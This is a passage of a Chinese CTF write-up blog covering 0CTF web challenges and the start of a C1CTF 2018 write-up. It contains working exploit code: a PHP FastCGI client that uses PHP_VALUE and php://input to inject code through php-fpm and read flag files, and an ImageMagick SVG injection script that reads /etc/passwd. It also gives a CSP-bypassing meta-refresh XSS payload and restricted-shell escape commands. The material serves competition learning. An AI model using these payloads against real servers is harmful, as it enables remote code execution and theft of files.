&#123;</span></span><br><span class="line"><span class="string">        $this-&gt;_host = $host;</span></span><br><span class="line"><span class="string">        $this-&gt;_port = $port;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="string">     * alive at the end of a request</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    public function setKeepAlive($b)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $this-&gt;_keepAlive = (boolean)$b;</span></span><br><span class="line"><span class="string">        if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) &#123;</span></span><br><span class="line"><span class="string">            fclose($this-&gt;_sock);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Get the keep alive status</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @return Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    public function getKeepAlive()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        return $this-&gt;_keepAlive;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function connect()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        if (!$this-&gt;_sock) &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;_sock = fsockopen($this-&gt;_host);</span></span><br><span class="line"><span class="string">            var_dump($this-&gt;_sock);</span></span><br><span class="line"><span class="string">            if (!$this-&gt;_sock) &#123;</span></span><br><span class="line"><span class="string">                throw new Exception('Unable to connect to FastCGI application');</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Build a FastCGI packet</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param Integer $type Type of the packet</span></span><br><span class="line"><span class="string">     * @param String $content Content of the packet</span></span><br><span class="line"><span class="string">     * @param Integer $requestId RequestId</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function buildPacket($type, $content, $requestId = 1)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $clen = strlen($content);</span></span><br><span class="line"><span class="string">        return chr(self::VERSION_1)         /* version */</span></span><br><span class="line"><span class="string">            . chr($type)                    /* type */</span></span><br><span class="line"><span class="string">            . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */</span></span><br><span class="line"><span class="string">            . chr($requestId &amp; 0xFF)        /* requestIdB0 */</span></span><br><span class="line"><span class="string">            . chr(($clen &gt;&gt; 8 ) &amp; 0xFF)     /* contentLengthB1 */</span></span><br><span class="line"><span class="string">            . chr($clen &amp; 0xFF)             /* contentLengthB0 */</span></span><br><span class="line"><span class="string">            . chr(0)                        /* paddingLength */</span></span><br><span class="line"><span class="string">            . chr(0)                        /* reserved */</span></span><br><span class="line"><span class="string">            . $content;                     /* content */</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param String $name Name</span></span><br><span class="line"><span class="string">     * @param String $value Value</span></span><br><span class="line"><span class="string">     * @return String FastCGI Name value pair</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function buildNvpair($name, $value)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $nlen = strlen($name);</span></span><br><span class="line"><span class="string">        $vlen = strlen($value);</span></span><br><span class="line"><span class="string">        if ($nlen &lt; 128) &#123;</span></span><br><span class="line"><span class="string">            /* nameLengthB0 */</span></span><br><span class="line"><span class="string">            $nvpair = chr($nlen);</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line"><span class="string">            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if ($vlen &lt; 128) &#123;</span></span><br><span class="line"><span class="string">            /* valueLengthB0 */</span></span><br><span class="line"><span class="string">            $nvpair .= chr($vlen);</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line"><span class="string">            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        /* nameData &amp; valueData */</span></span><br><span class="line"><span class="string">        return $nvpair . $name . $value;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="string">     * @return array of NVPair</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function readNvpair($data, $length = null)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $array = array();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if ($length === null) &#123;</span></span><br><span class="line"><span class="string">            $length = strlen($data);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $p = 0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        while ($p != $length) &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            $nlen = ord($data&#123;$p++&#125;);</span></span><br><span class="line"><span class="string">            if ($nlen &gt;= 128) &#123;</span></span><br><span class="line"><span class="string">                $nlen = ($nlen &amp; 0x7F &lt;&lt; 24);</span></span><br><span class="line"><span class="string">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16);</span></span><br><span class="line"><span class="string">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8);</span></span><br><span class="line"><span class="string">                $nlen |= (ord($data&#123;$p++&#125;));</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            $vlen = ord($data&#123;$p++&#125;);</span></span><br><span class="line"><span class="string">            if ($vlen &gt;= 128) &#123;</span></span><br><span class="line"><span class="string">                $vlen = ($nlen &amp; 0x7F &lt;&lt; 24);</span></span><br><span class="line"><span class="string">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16);</span></span><br><span class="line"><span class="string">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8);</span></span><br><span class="line"><span class="string">                $vlen |= (ord($data&#123;$p++&#125;));</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);</span></span><br><span class="line"><span class="string">            $p += ($nlen + $vlen);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return $array;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param String $data String containing all the packet</span></span><br><span class="line"><span class="string">     * @return array</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function decodePacketHeader($data)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $ret = array();</span></span><br><span class="line"><span class="string">        $ret['version']       = ord($data&#123;0&#125;);</span></span><br><span class="line"><span class="string">        $ret['type']          = ord($data&#123;1&#125;);</span></span><br><span class="line"><span class="string">        $ret['requestId']     = (ord($data&#123;2&#125;) &lt;&lt; 8) + ord($data&#123;3&#125;);</span></span><br><span class="line"><span class="string">        $ret['contentLength'] = (ord($data&#123;4&#125;) &lt;&lt; 8) + ord($data&#123;5&#125;);</span></span><br><span class="line"><span class="string">        $ret['paddingLength'] = ord($data&#123;6&#125;);</span></span><br><span class="line"><span class="string">        $ret['reserved']      = ord($data&#123;7&#125;);</span></span><br><span class="line"><span class="string">        return $ret;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @return array</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function readPacket()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) &#123;</span></span><br><span class="line"><span class="string">            $resp = $this-&gt;decodePacketHeader($packet);</span></span><br><span class="line"><span class="string">            $resp['content'] = '';</span></span><br><span class="line"><span class="string">            if ($resp['contentLength']) &#123;</span></span><br><span class="line"><span class="string">                $len  = $resp['contentLength'];</span></span><br><span class="line"><span class="string">                while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) &#123;</span></span><br><span class="line"><span class="string">                    $len -= strlen($buf);</span></span><br><span class="line"><span class="string">                    $resp['content'] .= $buf;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            if ($resp['paddingLength']) &#123;</span></span><br><span class="line"><span class="string">                $buf=fread($this-&gt;_sock, $resp['paddingLength']);</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            return $resp;</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            return false;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="string">     * @return array</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    public function getValues(array $requestedInfo)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $this-&gt;connect();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $request = '';</span></span><br><span class="line"><span class="string">        foreach ($requestedInfo as $info) &#123;</span></span><br><span class="line"><span class="string">            $request .= $this-&gt;buildNvpair($info, '');</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="string">        if ($resp['type'] == self::GET_VALUES_RESULT) &#123;</span></span><br><span class="line"><span class="string">            return $this-&gt;readNvpair($resp['content'], $resp['length']);</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    public function request(array $params, $stdin)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $response = '';</span></span><br><span class="line"><span class="string">        $this-&gt;connect();</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $paramsRequest = '';</span></span><br><span class="line"><span class="string">        foreach ($params as $key =&gt; $value) &#123;</span></span><br><span class="line"><span class="string">            $paramsRequest .= $this-&gt;buildNvpair($key, $value);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if ($paramsRequest) &#123;</span></span><br><span class="line"><span class="string">            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        $request .= $this-&gt;buildPacket(self::PARAMS, '');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if ($stdin) &#123;</span></span><br><span class="line"><span class="string">            $request .= $this-&gt;buildPacket(self::STDIN, $stdin);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        $request .= $this-&gt;buildPacket(self::STDIN, '');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        do &#123;</span></span><br><span class="line"><span class="string">            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="string">            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) &#123;</span></span><br><span class="line"><span class="string">                $response .= $resp['content'];</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125; while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="string">            throw new Exception('Bad request');</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">       </span></span><br><span class="line"><span class="string">        switch (ord($resp['content'][4])) &#123;</span></span><br><span class="line"><span class="string">            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="string">                throw new Exception('This app cant multiplex [CANT_MPX_CONN]');</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">            case self::OVERLOADED:</span></span><br><span class="line"><span class="string">                throw new Exception('New request rejected; too busy [OVERLOADED]');</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="string">                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span></span><br><span class="line"><span class="string">                break;</span></span><br><span class="line"><span class="string">            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="string">                return $response;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$client = new AA("unix:///var/run/php-fpm.sock");</span></span><br><span class="line"><span class="string">$req = '/var/www/html/index.php';</span></span><br><span class="line"><span class="string">$uri = $req .'?'.'command=ls';</span></span><br><span class="line"><span class="string">var_dump($client);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$code = "&lt;?php var_dump(scandir('/'));echo base64_encode(file_get_contents('/flag.h'));\\n?&gt;";</span></span><br><span class="line"><span class="string">$php_value = "allow_url_include = On\\nopen_basedir = /\\nauto_prepend_file = php://input";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$params = array(       </span></span><br><span class="line"><span class="string">        'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0',</span></span><br><span class="line"><span class="string">        'REQUEST_METHOD'    =&gt; 'POST',</span></span><br><span class="line"><span class="string">        'SCRIPT_FILENAME'   =&gt; '/var/www/html/index.php',</span></span><br><span class="line"><span class="string">        'SCRIPT_NAME'       =&gt; '/var/www/html/index.php',</span></span><br><span class="line"><span class="string">        'QUERY_STRING'      =&gt; 'command=ls',</span></span><br><span class="line"><span class="string">        'REQUEST_URI'       =&gt; $uri,</span></span><br><span class="line"><span class="string">        'DOCUMENT_URI'      =&gt; $req,</span></span><br><span class="line"><span class="string">        #'DOCUMENT_ROOT'     =&gt; '/',</span></span><br><span class="line"><span class="string">        'PHP_VALUE'         =&gt; $php_value,</span></span><br><span class="line"><span class="string">        'SERVER_SOFTWARE'   =&gt; 'asd',</span></span><br><span class="line"><span class="string">        'REMOTE_ADDR'       =&gt; '127.0.0.1',</span></span><br><span class="line"><span class="string">        'REMOTE_PORT'       =&gt; '9985',</span></span><br><span class="line"><span class="string">        'SERVER_ADDR'       =&gt; '127.0.0.1',</span></span><br><span class="line"><span class="string">        'SERVER_PORT'       =&gt; '80',</span></span><br><span class="line"><span class="string">        'SERVER_NAME'       =&gt; 'localhost',</span></span><br><span class="line"><span class="string">        'SERVER_PROTOCOL'   =&gt; 'HTTP/1.1',</span></span><br><span class="line"><span class="string">        'CONTENT_LENGTH'    =&gt; strlen($code)</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo "Call: $uri\\n\\n";</span></span><br><span class="line"><span class="string">var_dump($client-&gt;request($params, $code));</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">ret = execute_php_code(code)</span><br><span class="line">print(ret)</span><br></pre></td></tr></table></figure>

<p>然后可以发现根目录的 <code>flag.so</code> 和 <code>flag.h</code>, 读取后 strings 一下就能读到 flag. 不过可以看到是与 ffi 有关的, 所以这做法应该是非预期了, 不过之后又上了个 noeasyphp 修了几个非预期解.<br>最后试了下用 ffi 拿 flag,  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ffi = FFI::load(<span class="string">"/flag.h"</span>);</span><br><span class="line">var_dump($ffi);</span><br><span class="line">var_dump($ffi-&gt;flag_fUn3t1on_fFi());</span><br></pre></td></tr></table></figure>

<p>也是能读到 flag 的, 不过这方法名和文件名是怎么预期得到呢, 猜测可能需要用 ffi 的功能去直接越界读内存? 感觉预期解更有意思一点.  </p>
<h2 id="Wechat-Generator"><a href="#Wechat-Generator" class="headerlink" title="Wechat Generator"></a>Wechat Generator</h2><p>大概功能如下: </p>
<ol>
<li>前端提交对话到后端, 后端返回生成的 svg 和对应的 id 到前端预览</li>
<li>前端提交 id 到后端, 渲染 svg 到图片</li>
</ol>
<p>问题出在生成, 有个功能是插入表情, 比如 <code>[cool]</code>, 会被替换为  </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">x</span>=<span class="string">"1240"</span> <span class="attr">y</span>=<span class="string">"-60"</span> <span class="attr">height</span>=<span class="string">"100"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">xlink:href</span>=<span class="string">"http://pwnable.org:5000/static/emoji/cool"</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>显然可能存在注入, 我们输入 <code>[cool&quot;&gt;&lt;a&gt;&lt;/a&gt;&lt;a href=&quot;]</code>, 就成功注入了 <code>&lt;a&gt;&lt;/a&gt;</code> 到 svg 里面. 这里可以想到之前空指针的一道题, imagemagick 在对 <code>text:/</code> 协议解析时, 会直接读取文件里的内容, 于是我们就能通过这个方式, 注入一个图片, 链接到 <code>text:/etc/passwd</code>, 之后就能通过后端渲染得到的图片, 得到文件内容.  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line"></span><br><span class="line">d = <span class="string">'''</span></span><br><span class="line"><span class="string">[&#123;"type":0,"message":"Love you!&lt;a&gt;asd&lt;/a&gt;[cool\\"/&gt;&lt;image xlink:href=\\"text:/etc/passwd\\" x='-400px' y='400px' height='1500px' width='1500px'/&gt;&lt;a href=\\"]"&#125;,&#123;"type":1,"message":"Me too!!!"&#125;]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">res = sess.post(<span class="string">'http://pwnable.org:5000/preview'</span>, data=&#123;<span class="string">'data'</span>: d&#125;)</span><br><span class="line">svg = base64.b64decode(res.json()[<span class="string">'data'</span>][len(<span class="string">'data:image/svg+xml;base64,'</span>):])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.svg'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(svg)</span><br><span class="line"></span><br><span class="line">pid = res.json()[<span class="string">'previewid'</span>]</span><br><span class="line">res = sess.post(<span class="string">'http://pwnable.org:5000/share'</span>, data=&#123;<span class="string">'previewid'</span>: pid&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p>这里注意, 注入的内容前面一定要跟点东西, 不能直接这样 <code>[&quot;&gt;&lt;a&gt;&lt;/a&gt;&lt;a href=&quot;]</code>, 因为 <code>http://pwnable.org:5000/static/emoji/</code>, 返回的是 404, 而 <code>http://pwnable.org:5000/static/emoji/随意的内容</code> 返回的是微笑. 如果什么都没有, imagemagick 得到 404 的话, 解析会直接中止.  </p>
<p>现在就能读取文件了, 结合后端是 python, 然后一顿测试, 得到应用在 <code>/app/app.py</code>, 可惜这里因为 imagemagick 的问题, 能读的源码有限, 调大图片尺寸也只能得到放大的文字, 不能显示更多的文字.  </p>
<p>部分源码:  </p>
<p><img src="https://i.loli.net/2020/06/29/Gde8ry9uX3TKjR7.png" alt="">  </p>
<p>访问 <code>http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws</code>, 然后题目一转 xss… 要求 alert(1).<br>因为这里有 csp 限制, 没法直接在 svg 里面用 script alert, 导致这里卡了挺久, 然后发现 imagemagick 生成的文件拓展名是可控的, 也就是第二步, 得到图片的路径是 <code>http://pwnable.org:5000/image/gzVIsH/png</code>, 修改最后的 png 到 svg, 就会如蜜传如蜜, 直接输出一张的 svg, 而且 content-type 也会改变. 不过这里后端限制了扩展名长度只能为 3, 否则会直接报错.<br>这里查看文档, 发现 imagemagick 是支持输出 htm 的, <code>http://pwnable.org:5000/image/gzVIsH/htm</code> 得到的就是 htm, content-type 也变成了 <code>text/html</code>. 于是 xss 思路就来了, 看到源码的过滤是直接替换为空, 可以用喜闻乐见的双写绕过.<br>然后在 svg 里面把最外面的 svg tag 给闭合了, 插入一个 html tag, 再用 meta 标签跳到我们的站上 alert(1) 即可, 这样就绕过了 csp.  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = <span class="string">'''</span></span><br><span class="line"><span class="string">[&#123;"type":0,"message":"Love you!&lt;a&gt;asd&lt;/a&gt;[cool\\"/&gt;&lt;/g&gt;&lt;/svg&gt;&lt;html&gt;&lt;metmetaa http-equiv='refresh' content=\\"0;URL='http://site.com/'\\" /&gt;&lt;/html&gt;&lt;a href=\\"]"&#125;,&#123;"type":1,"message":"Me too!!!"&#125;]</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>

<p>不过感觉可能也是非预期? 因为看源码还有个可控 callback name 的 jsonp 没用上.  </p>
<p>PS. 这里其实可以直接读 /proc/self/environ 来读环境变量, 可惜 imagemagick 碰到 \x00 就停止读取了, 导致只能读取第一个环境变量 PATH, 都不到后面的 flag</p>
]]></content>
      <tags>
        <tag>web</tag>
        <tag>writeup</tag>
        <tag>0ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>C1CTF 2018 Writeup</title>
    <url>/2018/12/12/c1ctf-2018-writeup/</url>
    <content><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x01-签到"><a href="#0x01-签到" class="headerlink" title="0x01 签到"></a>0x01 签到</h3><p>base64 解码一下就行, 不懂的同学可以看一下<a href="https://www.rmb122.cn/index.php/2018/04/26/base64-%E7%BC%96%E7%A0%81%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">这个</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ base64 -d                                     </span><br><span class="line">QzFDVEZ7dzNsZWMwbWVfdE9fQzFDVEZ9</span><br><span class="line">C1CTF&#123;w3lec0me_tO_C1CTF&#125;</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h3 id="0x02-find-the-flag"><a href="#0x02-find-the-flag" class="headerlink" title="0x02 find the flag~"></a>0x02 find the flag~</h3><p>这道题我应该是非预期了 233 我用的是</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ scp -P 8999 -r ssh_bash@212.64.85.131:/home/ssh_bash/ .</span><br></pre></td></tr></table></figure>

<p>直接把整个文件夹给下下来了, 正确做法应该是尝试几个常用命令可以发现有 python, 然后直接用 os.system 就 OK 了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">'/bin/ls /home/ssh_bash/'</span>)</span><br><span class="line">bin  c5836008c1649301e29351a55db8f65c</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">'/bin/cat c5836008c1649301e29351a55db8f65c'</span>)</span><br><span class="line">C1CTF&#123;Bash_l1mit3d&#125;</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>

<h3 id="0x03-cats-and-dogs"><a href="#0x03-cats-and-dogs" class="headerlink" title="0x03 cats and dogs"></a>0x03 cats and dogs</h3><p>脑洞一下可以想到出题人把二维码中的黑的像素换成狗的图片, 把白的像素换成喵咪的图片. binwalk 出来的 mysql 文件应该是意外…</p>
<p>图片大小 17400x17400, 可以靠神经网络来识别内容, 当然你也可以靠人工来识别, 如果你有足够耐心的话… </p>
<p>先靠 PIL 把图像给切割了, 如果因为图像太大, 遇到 DecompressionBombError, 可以把 PIL 源码改成 pass 就可以了, 报错是不可能报错的, 这辈子都不可能报错的</p>
<p><img src="https://i.loli.net/2019/03/08/5c826d05ce0aa.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.open(<span class="string">'cat&amp;dog.jpg'</span>)</span><br><span class="line"><span class="comment">#region = (0, 0, 200, 200)</span></span><br><span class="line"><span class="comment"># (x0,y0,x1,y1)</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">87</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">87</span>):</span><br><span class="line">        tmp = (<span class="number">0</span> + x * <span class="number">200</span>, <span class="number">0</span> + y * <span class="number">200</span>, <span class="number">200</span> + x * <span class="number">200</span>, <span class="number">200</span> + y * <span class="number">200</span>)</span><br><span class="line">        part = img.crop(tmp)</span><br><span class="line">        part.save(<span class="string">f'pics/<span class="subst">&#123;num&#125;</span>.png'</span>)</span><br><span class="line">        num += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>切割完成后考虑的就是识别的问题了. HINT 给了数据集, 可以在 Github 上找现成的, 中间试了好几个模型, 最后找到<a href="https://github.com/mrgloom/kaggle-dogs-vs-cats-solution" target="_blank" rel="noopener">这个</a>, 是 google 之类拿来发论文的模型, 准确率不知道比个人训练的好到哪里去了. 我自己用的 linux, 装起环境来还挺方便, 这里一键装个 Caffe 就行了. 然后改一下示例代码. 用了 SqeezeNet_v1.1 的模型, 然后开跑就 ok</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> usefull_utils</span><br><span class="line"></span><br><span class="line"><span class="comment">#Iterate over all data and get prediction errors</span></span><br><span class="line"></span><br><span class="line">os.environ[<span class="string">'GLOG_minloglevel'</span>] = <span class="string">'2'</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> caffe</span><br><span class="line"></span><br><span class="line"><span class="string">'''if len(sys.argv) != 6:</span></span><br><span class="line"><span class="string">    print "Usage: python get_predition_errors.py deploy.prototxt model.caffemodel mean.npy &lt;cat_data_folder&gt; &lt;dog_data_folder&gt;"</span></span><br><span class="line"><span class="string">    sys.exit()'''</span></span><br><span class="line">    </span><br><span class="line">DEPLOY_PROTOTXT = <span class="string">'kaggle-dogs-vs-cats-solution/demo/SqeezeNet_v1.1/deploy.prototxt'</span> <span class="comment">#deploy.prototxt</span></span><br><span 